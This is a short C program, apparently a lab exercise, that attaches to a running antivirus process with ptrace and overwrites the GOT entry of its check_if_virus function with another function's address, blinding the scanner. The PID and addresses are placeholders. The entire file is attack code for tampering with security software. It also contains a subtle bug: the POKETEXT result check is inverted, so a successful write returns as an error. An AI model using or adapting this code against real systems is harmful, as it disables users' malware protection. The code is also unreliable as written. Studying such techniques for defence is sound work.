#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

// the pid variable and its placeholder value 
int pid                    = 0x01234567;

// the address of the GOT entry of the check_if_virus function and its placeholder value 
int check_if_virus_got_address = 0x89ABCDEF;

// the address of the alternative function to the check_if_virus function and its placeholder value 
int alt_function_address = 0x76543210; 


int main() {

    // attach to antivirus
    if(ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1)
    {
        perror("attach");
        return 1;
    }

    int status; 

    // wait for antivirus to stop 
    waitpid(pid, &status, 0);
    
    if(WIFEXITED(status))
        return 1; 

    // change the GOT entry of check_if_virus with the address of alternative (antivirus/is_directory) 
    if(ptrace(PTRACE_POKETEXT, pid, check_if_virus_got_address, alt_function_address) != -1)
    {
        perror("poketext");
        return 1;
    }

    // detach from antivirus 
    if(ptrace(PTRACE_DETACH, pid, NULL, NULL) == -1)
    {
        perror("detach");
        return 1;
    }

    return 0;
}
